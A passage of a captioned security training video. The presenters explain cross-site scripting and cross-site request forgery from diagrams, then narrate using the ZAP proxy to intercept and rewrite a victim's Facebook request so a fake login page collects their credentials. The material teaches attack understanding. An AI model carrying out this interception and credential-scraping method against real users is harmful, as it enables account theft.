day.\n\n259\n00:10:38.440 --> 00:10:40.500\nKind of like Icarus, but with a hacker.\n\n260\n00:10:40.500 --> 00:10:43.570\nSo it's like licorice, Icarus,\nand hackeress all together.\n\n261\n00:10:43.570 --> 00:10:44.070\n&gt;&gt; Yes.\n&gt;&gt; Hackeress.\n\n262\n00:10:44.070 --> 00:10:44.670\nSo we can think of that.\n\n263\n00:10:44.670 --> 00:10:47.120\nBut just a random observation on culture.\n\n264\n00:10:47.120 --> 00:10:49.310\nSo you actually made\na really interesting point.\n\n265\n00:10:49.310 --> 00:10:50.815\nNot that you don't normally,\ncuz you always do.\n\n266\n00:10:50.815 --> 00:10:52.432\n&gt;&gt; [LAUGH]\n&gt;&gt; But, so that came out the wrong way.\n\n267\n00:10:52.432 --> 00:10:53.140\n&gt;&gt; [LAUGH]\n&gt;&gt; I apologize.\n\n268\n00:10:53.140 --> 00:10:54.440\nThat's not what I meant to imply.\n\n269\n00:10:54.440 --> 00:10:56.648\nBut you made a really interesting\nobservation just now,\n\n270\n00:10:56.648 --> 00:11:01.530\nwhen you said it's like in the army, for\ninstance, where it's a generic reference.\n\n271\n00:11:01.530 --> 00:11:04.930\nIt's sir regardless of whether it is\na man or a woman that's in command or\n\n272\n00:11:04.930 --> 00:11:08.410\nsomebody above you that you were\nreferring to, just generically.\n\n273\n00:11:08.410 --> 00:11:10.630\nIt's just a genericized term,\nand that's absolutely correct.\n\n274\n00:11:10.630 --> 00:11:14.110\nAnd I do buy that argument, but\nit's kind of interesting because\n\n275\n00:11:14.110 --> 00:11:19.470\nwhen you think about it, we know that\nthere is a bend towards a tradition\n\n276\n00:11:19.470 --> 00:11:24.150\nin certain industries in certain areas\nof male dominance, unfortunately,\n\n277\n00:11:24.150 --> 00:11:27.190\ngoing back historically many,\nmany years in some cases.\n\n278\n00:11:27.190 --> 00:11:30.420\nAnd so those kind of things\ncome from that cultural bias,\n\n279\n00:11:30.420 --> 00:11:35.200\nbecause it's sir, because up until very\nrecently, it was only sirs, right?\n\n280\n00:11:35.200 --> 00:11:38.790\nThere were no women in those positions\nof authority, or very few of them.\n\n281\n00:11:38.790 --> 00:11:41.320\nThere are certainly many more now and\nit's a great thing.\n\n282\n00:11:41.320 --> 00:11:43.840\nBut historically it was not a woman who\n\n283\n00:11:43.840 --> 00:11:46.120\nwould have been in that\nposition being addressed.\n\n284\n00:11:46.120 --> 00:11:48.385\nAnd it's unfortunately still the case.\n\n285\n00:11:48.385 --> 00:11:50.516\nAnd it is something that every day,\n\n286\n00:11:50.516 --> 00:11:53.500\ninformation security professionals\nneed to wake up and think about and\n\n287\n00:11:53.500 --> 00:11:56.870\ntry to figure out how to get more\nwomen involved in what we do,\n\n288\n00:11:56.870 --> 00:12:02.070\nbecause this is a male dominated pursuit,\nunfortunately, for many, many reasons,\n\n289\n00:12:02.070 --> 00:12:06.450\nmost of which are totally ridiculous and\ninvalid and just simply wrong.\n\n290\n00:12:06.450 --> 00:12:10.140\nBut the reality is there just are not\nas many women in information security\n\n291\n00:12:10.140 --> 00:12:11.100\nas there are men.\n\n292\n00:12:11.100 --> 00:12:14.466\nAnd it's been a male dominated pursuit for\nmany, many years.\n\n293\n00:12:14.466 --> 00:12:17.666\nAnd as a result of that, it is hacker\nbecause we just didn't really have a lot\n\n294\n00:12:17.666 --> 00:12:19.766\nof women that would have\nbeen doing these things,\n\n295\n00:12:19.766 --> 00:12:22.310\neven though there certainly\nwere some all along.\n\n296\n00:12:22.310 --> 00:12:25.270\nAnd it was never hackeress because\nwomen were not the predominant\n\n297\n00:12:25.270 --> 00:12:26.640\npeople involved in these things.\n\n298\n00:12:26.640 --> 00:12:30.110\nSo it's interesting when you think about\nthe culture as well as the reality\n\n299\n00:12:30.110 --> 00:12:32.430\nthat creates it, and\nthen what comes from that.\n\n300\n00:12:32.430 --> 00:12:37.200\nNow that we've totally gone off the rails\nand have said something very important and\n\n301\n00:12:37.200 --> 00:12:40.860\nobviously a good observation, but\nnot related directly to what we're talking\n\n302\n00:12:40.860 --> 00:12:42.430\nabout, let's actually\nget back to business.\n\n303\n00:12:42.430 --> 00:12:44.128\nSo let's go over there.\n\n304\n00:12:44.128 --> 00:12:45.271\nNo, wait, actually it's over there.\n\n305\n00:12:45.271 --> 00:12:46.266\n[NOISE] Wait, right there.\n\n306\n00:12:46.266 --> 00:12:48.000\nYeah, right there, perfect.\n\n307\n00:12:48.000 --> 00:12:49.320\nI had it.\nThat was awesome.\n\n308\n00:12:49.320 --> 00:12:50.480\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm finally figuring it out.\n\n309\n00:12:50.480 --> 00:12:52.860\nI gotta go opposite and I have to go over.\n\n310\n00:12:52.860 --> 00:12:54.340\nSo that's, I'm working that out.\n\n311\n00:12:54.340 --> 00:12:57.393\nWhat I need is a mirror on the other wall,\nso that it's the opposite, so\n\n312\n00:12:57.393 --> 00:12:59.790\nI can actually,\nI could figure that out as we go.\n\n313\n00:12:59.790 --> 00:13:00.349\nAll right.\nSo\n\n314\n00:13:00.349 --> 00:13:06.230\nwe do have here an example of a generic\ndiagram of what an XSS attack is.\n\n315\n00:13:06.230 --> 00:13:09.626\nAnd as Mike walked us through it briefly,\nit really helped us to understand.\n\n316\n00:13:09.626 --> 00:13:10.520\nIt's you in the red.\n\n317\n00:13:10.520 --> 00:13:11.705\nI think that's the, right.\n\n318\n00:13:11.705 --> 00:13:16.268\nSo the first one up there, right,\nwe have the user, whoever's being targeted\n\n319\n00:13:16.268 --> 00:13:21.241\nattacking or rather, excuse me, connecting\nto a website and being infected with some\n\n320\n00:13:21.241 --> 00:13:25.175\nsort of a script as result of going and\nviewing the web page, right?\n\n321\n00:13:25.175 --> 00:13:26.040\n&gt;&gt; Mm-hm.\n&gt;&gt; So\n\n322\n00:13:26.040 --> 00:13:29.290\nthe idea is not on the very first one\nbecause that's the hacker going in and\n\n323\n00:13:29.290 --> 00:13:31.330\ninfecting the web page initially.\n\n324\n00:13:31.330 --> 00:13:35.360\nBut once that takes place, the viewer,\nright, which is the victim, goes down and\n\n325\n00:13:35.360 --> 00:13:36.300\ngoes to the webpage.\n\n326\n00:13:36.300 --> 00:13:39.850\nAnd as soon as they view it,\nthe attack script launches, comes back,\n\n327\n00:13:39.850 --> 00:13:42.730\nand does whatever it's\ngonna do on their machine.\n\n328\n00:13:42.730 --> 00:13:45.900\nAnd then when they are redirected,\nmanipulated, compromised,\n\n329\n00:13:45.900 --> 00:13:48.780\nwhatever the case may be,\nthey wind up going out to another website.\n\n330\n00:13:48.780 --> 00:13:50.800\nGenerically, we referenced it as just www.\n\n331\n00:13:50.800 --> 00:13:55.260\nIt's any kind of website that\nthe attacker is looking to get us to.\n\n332\n00:13:55.260 --> 00:13:58.140\nAnd then we are obviously\ngonna fall prey to that.\n\n333\n00:13:58.140 --> 00:14:00.880\nI know that we did cross site\nrequest forgery as well, right?\n\n334\n00:14:00.880 --> 00:14:02.290\n&gt;&gt; We did.\n\n335\n00:14:02.290 --> 00:14:04.380\n&gt;&gt; So let's take a look at\nthat if we can pull that up.\n\n336\n00:14:04.380 --> 00:14:06.660\nI think, yeah, we do have that\ndiagram there, which is great.\n\n337\n00:14:06.660 --> 00:14:09.280\nSo let's talk about cross\nsite request forgery as well.\n\n338\n00:14:09.280 --> 00:14:11.545\nThis is another interesting one, right?\n\n339\n00:14:11.545 --> 00:14:16.020\nAnd you made the observation about\nthe fact that when we do cross site\n\n340\n00:14:17.040 --> 00:14:21.760\nscripting that indirectly we are being\nessentially manipulated through\n\n341\n00:14:21.760 --> 00:14:23.610\na manipulated or attacked web server.\n\n342\n00:14:23.610 --> 00:14:26.940\nSo it's not us being targeted, but\nit's anybody that is connecting.\n\n343\n00:14:26.940 --> 00:14:28.830\nAnd it's the same idea here,\n\n344\n00:14:28.830 --> 00:14:31.680\nbecause what we're looking at\nat some level is the attacker.\n\n345\n00:14:31.680 --> 00:14:33.430\nWe have attacker at the extreme left.\n\n346\n00:14:33.430 --> 00:14:35.280\nThey're going out to the victim and\n\n347\n00:14:35.280 --> 00:14:38.910\nthey're sending them some sort of\nan email, some sort of a link.\n\n348\n00:14:38.910 --> 00:14:40.480\nWe're not quite sure how\nthat's gonna get there.\n\n349\n00:14:40.480 --> 00:14:43.610\nWe can imagine all these\ndifferent ways this may occur, but\n\n350\n00:14:43.610 --> 00:14:46.560\nthe attacker is trying to get\nthe victim to go to the website.\n\n351\n00:14:46.560 --> 00:14:47.630\nWe called it exploit.com.\n\n352\n00:14:47.630 --> 00:14:48.980\nIt would obviously be any website.\n\n353\n00:14:48.980 --> 00:14:50.070\nIt doesn't really matter.\n\n354\n00:14:50.070 --> 00:14:52.130\nHopefully, not something\nas obvious as that, right?\n\n355\n00:14:52.130 --> 00:14:52.760\n&gt;&gt; Yeah, not exploit.com.\n\n356\n00:14:52.760 --> 00:14:54.070\n&gt;&gt; But then again you never know right?\n\n357\n00:14:54.070 --> 00:14:55.630\n&gt;&gt; [LAUGH]\n&gt;&gt; There are people who go,\n\n358\n00:14:55.630 --> 00:14:56.350\nthat sounds interesting.\n\n359\n00:14:56.350 --> 00:14:57.950\nI wanna see what's on that website.\n\n360\n00:14:57.950 --> 00:15:00.510\nSo the victim,\nif the victim does click on the link or\n\n361\n00:15:00.510 --> 00:15:03.530\nsomehow is tricked into going there or\nwhatever, it may happen, right?\n\n362\n00:15:03.530 --> 00:15:06.550\nThe victim goes into their browser,\nclicks on the link.\n\n363\n00:15:06.550 --> 00:15:09.450\nAnd obviously, remember these\nare application based attacks, right?\n\n364\n00:15:09.450 --> 00:15:12.600\nWe're manipulating functionality\nin the application layer.\n\n365\n00:15:12.600 --> 00:15:14.300\nSo we see that happening.\n\n366\n00:15:14.300 --> 00:15:17.900\nAnd then,\nthe browser engages in what browsers do.\n\n367\n00:15:17.900 --> 00:15:22.050\nSends a get request out to\nbe able to get exploit.com,\n\n368\n00:15:22.050 --> 00:15:24.550\nand goes to the malicious server.\n\n369\n00:15:24.550 --> 00:15:28.040\nAnd again, the malicious server is where\nthe exploit actually lives, right?\n\n370\n00:15:28.040 --> 00:15:29.710\nWe're gonna talk about that in a minute.\n\n371\n00:15:29.710 --> 00:15:34.660\nSo what we didn't show in this attack\nis part of setup, which we do in XSS\n\n372\n00:15:34.660 --> 00:15:39.000\nis the attacker manipulating\nthe server to set up the script.\n\n373\n00:15:39.000 --> 00:15:40.030\nBut in this case,\n\n374\n00:15:40.030 --> 00:15:44.460\nthey're not manipulating the end server\nthat we wanna actually connect to.\n\n375\n00:15:44.460 --> 00:15:48.112\nThey're manipulating the server they want\nus connected to in order to be able to\n\n376\n00:15:48.112 --> 00:15:49.155\ncarry out the attack.\n\n377\n00:15:49.155 --> 00:15:52.890\nBecause the end game is gonna\nbe that server on the far right,\n\n378\n00:15:52.890 --> 00:15:57.371\nwhich is the bank server, or\nthe financial server, whatever it may be.\n\n379\n00:15:57.371 --> 00:15:59.179\nAre we doing a little\nrenovation in real time here?\n\n380\n00:15:59.179 --> 00:16:00.404\n&gt;&gt; Yeah, exactly.\n\n381\n00:16:00.404 --> 00:16:02.435\n&gt;&gt; Are we getting ready to flip and\nmake some money?\n\n382\n00:16:02.435 --> 00:16:04.360\n&gt;&gt; [LAUGH] Yeah, I think so,\nwe're gonna take it to Shark Tank.\n\n383\n00:16:04.360 --> 00:16:05.160\n&gt;&gt; All right, cool so-\n&gt;&gt; So\n\n384\n00:16:05.160 --> 00:16:07.530\nthe attacker compromised\nthat malicious server.\n\n385\n00:16:07.530 --> 00:16:09.900\n&gt;&gt; All right, so they've set up or\ncompromised the server, right?\n\n386\n00:16:09.900 --> 00:16:10.600\nThey may own it, right?\n\n387\n00:16:10.600 --> 00:16:13.710\nOne of the distinctions is again that\nthey may actually own the server, or\n\n388\n00:16:13.710 --> 00:16:17.720\nthey may have manipulated and compromised\nsomebody else's server, maybe a bot or\n\n389\n00:16:17.720 --> 00:16:19.070\na zombie of some kind.\n\n390\n00:16:19.070 --> 00:16:21.070\nSo we're not quite sure what they've done,\nbut\n\n391\n00:16:21.070 --> 00:16:23.270\nwe know there is a malicious\nserver hanging out there.\n\n392\n00:16:23.270 --> 00:16:25.816\nBut back to the XSS picture for\njust a second.\n\n393\n00:16:25.816 --> 00:16:31.070\nSo the difference here is that\nthe attacker, or the hacker as we call it,\n\n394\n00:16:31.070 --> 00:16:36.238\non the left, the first box, is going\nout and infecting an existing site\n\n395\n00:16:36.238 --> 00:16:41.920\nwith a script that they then want us to\nbe able to somehow be manipulated by.\n\n396\n00:16:41.920 --> 00:16:44.270\nWhen we go to a good webpage,\nand then remember,\n\n397\n00:16:44.270 --> 00:16:46.340\nthey're gonna own the box on the right.\n\n398\n00:16:46.340 --> 00:16:49.910\nWe just didn't label it that way which is\nwhere they want the attack to wind up.\n\n399\n00:16:49.910 --> 00:16:53.370\nSo there is still gonna be this,\nI've got one server that we're\n\n400\n00:16:53.370 --> 00:16:57.980\nworking with to try to trick you into\ngoing to, and the mechanism for delivery.\n\n401\n00:16:57.980 --> 00:17:00.724\nSo both of those themes exist\nin both of these attacks, but\n\n402\n00:17:00.724 --> 00:17:04.255\nwe see them a little bit differently,\nand they're actually out of order.\n\n403\n00:17:04.255 --> 00:17:09.562\nBecause in Cross-Site Request Forgery\nwe go to the malicious server and\n\n404\n00:17:09.562 --> 00:17:14.260\nwe ultimately, when we go there\nare not necessarily going there\n\n405\n00:17:14.260 --> 00:17:18.180\nbecause of a script that\ntells us to go there, right?\n\n406\n00:17:18.180 --> 00:17:22.420\nWe're not downloading a script and\nthen being manipulated directly.\n\n407\n00:17:22.420 --> 00:17:24.790\nWe're getting a link or some sort of\nphishing email that takes us there and\n\n408\n00:17:24.790 --> 00:17:25.740\nthen the script executes.\n\n409\n00:17:25.740 --> 00:17:28.770\nSo it may be a little bit different\nthan what we see with XSS.\n\n410\n00:17:28.770 --> 00:17:32.117\nBut ultimately, the goal here is we do\nthe GET, so we're getting the page.\n\n411\n00:17:32.117 --> 00:17:35.042\nWe're then coming back with the response,\nwhatever that is, so\n\n412\n00:17:35.042 --> 00:17:38.498\nthe web server sends back the response\nfrom the malicious server on typically\n\n413\n00:17:38.498 --> 00:17:41.920\nwhat will come back and be highlighted\nin blue so you could just see it.\n\n414\n00:17:41.920 --> 00:17:45.148\nWould be something like\nsome sort of script, or\n\n415\n00:17:45.148 --> 00:17:47.900\ncode that's gonna execute something.\n\n416\n00:17:47.900 --> 00:17:50.910\nSo I think that one is something\nlike hidden form, right?\n\n417\n00:17:50.910 --> 00:17:51.980\nDoc submit or whatever.\n\n418\n00:17:51.980 --> 00:17:55.550\nSo there's going to be some sort of\nmanipulation that takes place right?\n\n419\n00:17:55.550 --> 00:18:00.060\nAnd then we're gonna put\ninformation back out through a post\n\n420\n00:18:00.060 --> 00:18:03.650\nfrom the browser in\nthe targets application.\n\n421\n00:18:03.650 --> 00:18:05.550\nAnd it's going to go to the bank server,\n\n422\n00:18:05.550 --> 00:18:07.515\nlet's say typically a financial\nserver of some kind,\n\n423\n00:18:07.515 --> 00:18:12.215\ncuz we're normally using these attacks\nto manipulate financial related systems.\n\n424\n00:18:12.215 --> 00:18:14.410\n&gt;&gt; Mm-hm.\n&gt;&gt; So we're going to post up data there\n\n425\n00:18:14.410 --> 00:18:16.920\nand we're going to open\nup a valid session right?\n\n426\n00:18:16.920 --> 00:18:18.820\n&gt;&gt; Right.\n&gt;&gt; This is the user logging in.\n\n427\n00:18:18.820 --> 00:18:23.060\nWhat the attacker wants to do is\nuse that valid session to then make\n\n428\n00:18:23.060 --> 00:18:27.190\na manipulation of the system in some way\nunder the guise of the user credential,\n\n429\n00:18:27.190 --> 00:18:28.670\nbut without the knowledge of the user.\n\n430\n00:18:28.670 --> 00:18:31.920\nSo we're manipulating\nthe existing user credential and\n\n431\n00:18:31.920 --> 00:18:36.410\nthen if all goes well, at the bottom\nunderneath the second blue rectangle,\n\n432\n00:18:36.410 --> 00:18:39.600\nwhich is the valid session id\nbeing used to set up the Exchange.\n\n433\n00:18:39.600 --> 00:18:44.070\nWe have move funds, or check balance,\nor whatever the case may be.\n\n434\n00:18:44.070 --> 00:18:46.200\nWhatever the bad actor is up to, right?\n\n435\n00:18:46.200 --> 00:18:48.450\nAnd then that's happening\nin the bank database.\n\n436\n00:18:48.450 --> 00:18:51.090\nAnd then what we didn't really add\nin there but ultimately happens is\n\n437\n00:18:51.090 --> 00:18:54.250\nyou obviously, at the end,\nthe attacker, if they're successful,\n\n438\n00:18:54.250 --> 00:18:58.070\ngains the advantage and the user may or\nmay not realize this is taking place.\n\n439\n00:18:58.070 --> 00:19:02.630\nSo we wanna make sure we understand that\nultimately, this forces, this stop process\n\n440\n00:19:02.630 --> 00:19:06.050\nis forcing as we can see with the various\nerrors moving back and forth.\n\n441\n00:19:06.050 --> 00:19:10.240\nForcing the logged on victim's\nbrowser to send a forged HTTP request.\n\n442\n00:19:10.240 --> 00:19:13.870\nSo we don't realize we're sending that\nrequest because of the hidden form\n\n443\n00:19:13.870 --> 00:19:15.620\nmanipulation there, right?\n\n444\n00:19:15.620 --> 00:19:18.970\nAnd with that we include\nthe victim's session cookie, and\n\n445\n00:19:18.970 --> 00:19:22.580\nany other authentication\ninformation necessary to establish\n\n446\n00:19:22.580 --> 00:19:24.840\nour validity in terms of the session ID.\n\n447\n00:19:24.840 --> 00:19:26.720\nWe send that to a vulnerable web app.\n\n448\n00:19:26.720 --> 00:19:29.640\nThis allows the attacker to\nforce the victim's browser\n\n449\n00:19:29.640 --> 00:19:32.680\nto generate requests that\nthe application thinks are legitimate,\n\n450\n00:19:32.680 --> 00:19:35.060\nbecause they think it's coming\nfrom the right session ID.\n\n451\n00:19:35.060 --> 00:19:37.320\nBut it's not,\nit's been manipulated by the attacker.\n\n452\n00:19:37.320 --> 00:19:38.510\nRight?\nSo it's kinda interesting.\n\n453\n00:19:38.510 --> 00:19:39.010\nWe're-\n&gt;&gt; Yes.\n\n454\n00:19:39.010 --> 00:19:39.760\n&gt;&gt; We're getting in there and\n\n455\n00:19:39.760 --> 00:19:41.850\nmanipulating the identity.\n\n456\n00:19:41.850 --> 00:19:45.130\nInformation, the session ID's we've\ntalked about becomes really critical\n\n457\n00:19:45.130 --> 00:19:46.720\nin these particular cases.\n\n458\n00:19:46.720 --> 00:19:50.012\nAnd this is something that's going to be,\nfor us,\n\n459\n00:19:50.012 --> 00:19:52.860\na thought process that we want to\nat least have and keep in mind.\n\n460\n00:19:52.860 --> 00:19:55.430\nLet's take a look at one way\nin which this may happen.\n\n461\n00:19:55.430 --> 00:19:58.950\nIf we can switch to my machine,\nwe can show something.\n\n462\n00:19:58.950 --> 00:20:02.200\nHello, all right,\nwe can go to full screen on that.\n\n463\n00:20:02.200 --> 00:20:03.060\nSo we can take a look.\n\n464\n00:20:03.060 --> 00:20:04.100\nThere, perfect, all right.\n\n465\n00:20:04.100 --> 00:20:07.470\nSo and\nhopefully you'll be able to see that.\n\n466\n00:20:07.470 --> 00:20:08.990\nYeah.\nOkay.\n\n467\n00:20:08.990 --> 00:20:09.700\nLet's do that.\n\n468\n00:20:09.700 --> 00:20:10.660\nNo problem.\n\n469\n00:20:10.660 --> 00:20:15.730\nNate I think left that on the, you need\na magnifying glass to be able to see that.\n\n470\n00:20:15.730 --> 00:20:20.510\nSo let's go ahead and let's,\nin the remote session.\n\n471\n00:20:20.510 --> 00:20:21.670\nI cannot change that.\n\n472\n00:20:21.670 --> 00:20:22.930\nNo problem.\n\n473\n00:20:22.930 --> 00:20:23.740\nNo, no, no, no worries.\n\n474\n00:20:23.740 --> 00:20:25.460\nLeave it up,\nwe'll be able to narrate through it.\n\n475\n00:20:25.460 --> 00:20:26.010\nNo problem.\n\n476\n00:20:26.010 --> 00:20:27.830\nSo let me just tell you what we're doing,\nno big deal.\n\n477\n00:20:28.990 --> 00:20:33.110\nGet out your secret ITProTV decoder and\nmagnifying glass ring.\n\n478\n00:20:33.110 --> 00:20:37.810\nHold it up to the screen, and you have\nthe chant booga, booga, booga, three times\n\n479\n00:20:37.810 --> 00:20:40.600\nwhile you're jumping up and down and\nyou'll be able to see the following.\n\n480\n00:20:40.600 --> 00:20:43.490\nWhat were using is the zap attack prop.\n\n481\n00:20:43.490 --> 00:20:45.210\nAnd we're going to cut back to\nMike's machine in a minute.\n\n482\n00:20:45.210 --> 00:20:45.900\nNot yet.\n\n483\n00:20:45.900 --> 00:20:50.025\nWhen we do, Mikes gonna have the OAS\npage up for the zap attack proxy so\n\n484\n00:20:50.025 --> 00:20:51.889\nhe can show you where to get it.\n\n485\n00:20:51.889 --> 00:20:52.717\nBut in the mean time,\n\n486\n00:20:52.717 --> 00:20:56.240\njust while we're waiting on that to happen\nI still wanna narrate through something.\n\n487\n00:20:56.240 --> 00:20:59.630\nWe've opened up and loaded the zap\nattack proxy and we've started it up.\n\n488\n00:20:59.630 --> 00:21:01.530\nConfiguration here is very simple.\n\n489\n00:21:01.530 --> 00:21:04.370\nAll you're doing is going in\nan loading the software, installing and\n\n490\n00:21:04.370 --> 00:21:05.230\nsetting it up.\n\n491\n00:21:05.230 --> 00:21:08.570\nYou do go into the tools menu,\nyou go to options,\n\n492\n00:21:08.570 --> 00:21:10.310\nyou go to the local proxy setting,\n\n493\n00:21:10.310 --> 00:21:14.750\nyou set up the IP address of the interface\nyou wanna use as the proxy listener.\n\n494\n00:21:14.750 --> 00:21:17.190\nIn this case it's the local\nIP of the machine.\n\n495\n00:21:17.190 --> 00:21:19.185\nYou specify the port number.\n\n496\n00:21:19.185 --> 00:21:22.300\n8080 is what we use traditionally for\nmost proxies.\n\n497\n00:21:22.300 --> 00:21:23.320\nSo we got that set up.\n\n498\n00:21:23.320 --> 00:21:26.460\nThat's real simple it's in\nthe documentation when you download\n\n499\n00:21:26.460 --> 00:21:26.990\nthe software.\n\n500\n00:21:26.990 --> 00:21:28.110\nReal easy to do.\n\n501\n00:21:28.110 --> 00:21:33.370\nThen what we did is we went\nover here to the tabs that will\n\n502\n00:21:33.370 --> 00:21:37.310\nnot have the tab that says break on it\nwhich is what I'm pointing to right now.\n\n503\n00:21:37.310 --> 00:21:38.675\nAnd we click this plus sign.\n\n504\n00:21:38.675 --> 00:21:41.905\nAnd when we click the plus sign one of\nthe drop down options is to put a brake\n\n505\n00:21:41.905 --> 00:21:42.445\ntab in there.\n\n506\n00:21:42.445 --> 00:21:47.495\nAnd what the brake tab does is let us\ncapture traffic and pause it, right?\n\n507\n00:21:47.495 --> 00:21:49.695\nOr capturing traffic,\nseeing it essentially,\n\n508\n00:21:49.695 --> 00:21:52.050\nand we can manipulate it on that tab.\n\n509\n00:21:52.050 --> 00:21:54.300\nAnd so we then start the capture.\n\n510\n00:21:54.300 --> 00:21:58.470\nThis little red button right up here\nthat is green until you click on it.\n\n511\n00:21:58.470 --> 00:22:03.340\nAnd that is going to allow us\nto actually start the break.\n\n512\n00:22:03.340 --> 00:22:05.278\nSo essentially filter the traffic in.\n\n513\n00:22:05.278 --> 00:22:09.319\nSo we turn that on and then when that\nhappens, whoever is using the proxy,\n\n514\n00:22:09.319 --> 00:22:12.644\nwhoever is been told to run\ntheir traffic through the proxy,\n\n515\n00:22:12.644 --> 00:22:15.336\nI set up another machine,\na Windows 8 machine.\n\n516\n00:22:15.336 --> 00:22:19.316\nI just opened up the configuration on\nthe browser, I said go to this machine for\n\n517\n00:22:19.316 --> 00:22:23.084\nthis proxy, and then I opened up a web\nsession and just started browsing.\n\n518\n00:22:23.084 --> 00:22:25.430\nI went to Facebook and\njust loaded the Facebook page.\n\n519\n00:22:25.430 --> 00:22:27.990\nWhen I did that I captured the GET request\n\n520\n00:22:27.990 --> 00:22:31.940\non the inbound traffic going through\nthe proxy to go to Facebook.\n\n521\n00:22:31.940 --> 00:22:35.850\nSo I went ahead and I started clicking\non this button right up here,\n\n522\n00:22:35.850 --> 00:22:37.870\njust to the right of\nthe little red circle,\n\n523\n00:22:37.870 --> 00:22:40.065\nwhich is the button that lets\nme capture the GET traffic.\n\n524\n00:22:40.065 --> 00:22:41.280\n&gt;&gt; Mm-hm.\n&gt;&gt; I have to click there to\n\n525\n00:22:41.280 --> 00:22:43.520\nessentially filter and\nlook for the GET traffic.\n\n526\n00:22:43.520 --> 00:22:48.085\nWhen I get that, I now have the header\nwith the GET information in it.\n\n527\n00:22:48.085 --> 00:22:50.080\n&gt;&gt; Mm-hm.\n&gt;&gt; That's what i'm looking at right here.\n\n528\n00:22:50.080 --> 00:22:51.790\nAnd then I can simply go in.\n\n529\n00:22:51.790 --> 00:22:53.090\nAnd I can right-click and I can go.\n\n530\n00:22:53.090 --> 00:22:55.875\nAnd I can either go to Find,\nand I can do a search.\n\n531\n00:22:55.875 --> 00:22:56.560\n&gt;&gt; Mm-hm.\n\n532\n00:22:56.560 --> 00:22:59.510\n&gt;&gt; Or I can use the Edit tool and\nI can go that.\n\n533\n00:22:59.510 --> 00:23:02.850\nAnd when I do that, what I'm gonna do is\nI'm gonna go and I'm gonna search for\n\n534\n00:23:02.850 --> 00:23:06.390\nall instances of the URL that\nI wanna ultimately replace.\n\n535\n00:23:06.390 --> 00:23:08.800\nRight, cuz remember this\nis a session hijack.\n\n536\n00:23:08.800 --> 00:23:10.980\nI wanna redirect this traffic.\n\n537\n00:23:10.980 --> 00:23:13.380\nI don't want you logging\ninto Facebook.com.\n\n538\n00:23:13.380 --> 00:23:16.840\nI want you logging in to Titus'\nversion of Facebook.com.\n\n539\n00:23:16.840 --> 00:23:17.440\nRight?\n\n540\n00:23:17.440 --> 00:23:20.889\nWhich is, yo not Facebook.com but\nit's anti-Facebook.com.\n\n541\n00:23:20.889 --> 00:23:22.033\n&gt;&gt; Yeah.\nSmackbook.com.\n\n542\n00:23:22.033 --> 00:23:24.710\n&gt;&gt; Or Bluesnap.com or\nwhatever it is, right?\n\n543\n00:23:24.710 --> 00:23:27.040\nSo as a result, I'm gonna go and\nI'm gonna manipulate this.\n\n544\n00:23:27.040 --> 00:23:29.840\nI'm gonna go do,\nessentially a find and replace, right?\n\n545\n00:23:29.840 --> 00:23:32.380\n&gt;&gt; I'm gonna go rip out all the URLs,\ngonna replace them.\n\n546\n00:23:32.380 --> 00:23:35.570\nThen I'm gonna unfreeze\nthis packet because,\n\n547\n00:23:35.570 --> 00:23:37.900\nremember, everything is\ngoing through the proxy.\n\n548\n00:23:37.900 --> 00:23:41.260\nSo what's essentially happened is\nthe user request has gone to me.\n\n549\n00:23:41.260 --> 00:23:43.483\nI'm the man in the middle now, right?\n\n550\n00:23:43.483 --> 00:23:44.231\n&gt;&gt; You're holding onto it.\n\n551\n00:23:44.231 --> 00:23:45.809\nAnd the user is still waiting for their-\n&gt;&gt; I'm holding onto it.\n\n552\n00:23:45.809 --> 00:23:46.973\n&gt;&gt; Page to come back, yeah.\n\n553\n00:23:46.973 --> 00:23:47.892\n&gt;&gt; The user has not seen\nthat page come up yet.\n\n554\n00:23:47.892 --> 00:23:48.816\nIt's delayed.\n\n555\n00:23:48.816 --> 00:23:51.842\nSo until I release it,\nthey're not gonna get anything.\n\n556\n00:23:51.842 --> 00:23:52.550\n&gt;&gt; Right.\n\n557\n00:23:52.550 --> 00:23:54.450\n&gt;&gt; So I'm now gonna manipulate this.\n\n558\n00:23:54.450 --> 00:23:56.560\nI'm gonna release it,\nI'm gonna send it off.\n\n559\n00:23:56.560 --> 00:23:57.720\nIt's gonna come back.\n\n560\n00:23:57.720 --> 00:24:01.220\nThey're gonna get the log on page but\nof the Facebook that we've created.\n\n561\n00:24:01.220 --> 00:24:01.760\n&gt;&gt; Right.\n\n562\n00:24:01.760 --> 00:24:02.940\n&gt;&gt; And they're gonna attempt to log in.\n\n563\n00:24:02.940 --> 00:24:05.960\nI'm gonna be able to scrape their\ncredentials or whatever I wanna do.\n\n564\n00:24:05.960 --> 00:24:11.320\nAs a result of that, this is\na combination of man in the middle and\n\n565\n00:24:11.320 --> 00:24:14.450\nor you can think of it as browser in the\nmiddle except it's not the browser that\n\n566\n00:24:14.450 --> 00:24:15.680\nwe're manipulating through.\n\n567\n00:24:15.680 --> 00:24:18.820\nWe're not using malicious code to do this,\n\n568\n00:24:18.820 --> 00:24:22.310\nwe're using an established product,\nbut we are manipulating the function.\n\n569\n00:24:22.310 --> 00:24:24.280\nIt really is a true man\nin the middle attack but,\n\n570\n00:24:24.280 --> 00:24:26.440\nthe idea is that we\nare running everything through.\n\n571\n00:24:26.440 --> 00:24:28.880\nIt's like a proxy in the middle attack,\nright as you were saying so\n\n572\n00:24:28.880 --> 00:24:29.770\nit's kind of like that.\n\n573\n00:24:29.770 --> 00:24:30.580\nSo absolutely correct.\n\n574\n00:24:30.580 --> 00:24:34.340\nI wanted to show you,\njust give you a sense of how this would\n\n575\n00:24:34.340 --> 00:24:37.450\nactually play out or how it would\nlook like because when we talk about,\n\n576\n00:24:37.450 --> 00:24:41.980\nhey this is what we're gonna do and\nthis is what you would see happen or\n\n577\n00:24:41.980 --> 00:24:44.940\nthis is what you actually do when\nyou execute one of these text.\n\n578\n00:24:44.940 --> 00:24:45.900\nYou don't always see it.\n\n579\n00:24:45.900 --> 00:24:47.910\nThis is what you would actually\nsee them in the middle of\n\n580\n00:24:47.910 --> 00:24:49.100\nthe attack as the attackers,\n\n581\n00:24:49.100 --> 00:24:53.420\nthe bad actor, this is my control panel\nthis is where I'm working my magic.\n\n582\n00:24:53.420 --> 00:24:54.990\nI'm waiting on the step to come in.\n\n583\n00:24:54.990 --> 00:24:57.650\nI'm gonna freeze that packet,\nI'm gonna edit it real quick and\n\n584\n00:24:57.650 --> 00:24:58.690\nI'm gonna release it.\n\n585\n00:24:58.690 --> 00:25:01.987\nAnd if I'm quick enough right and 